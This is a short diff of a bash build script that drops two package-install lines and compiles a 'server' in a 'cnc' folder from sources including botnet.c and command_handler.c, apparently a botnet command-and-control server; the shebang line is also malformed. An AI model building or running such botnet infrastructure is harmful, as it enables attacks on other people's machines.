@@ -1,6 +1,4 @@
 #/bin/bash
-apt-get install gcc -y
-apt-get install screen -y
 
 cd cnc
 gcc -o server main.c login_utils.c checks.c logger.c user_handler.c command_handler.c botnet.c -pthread
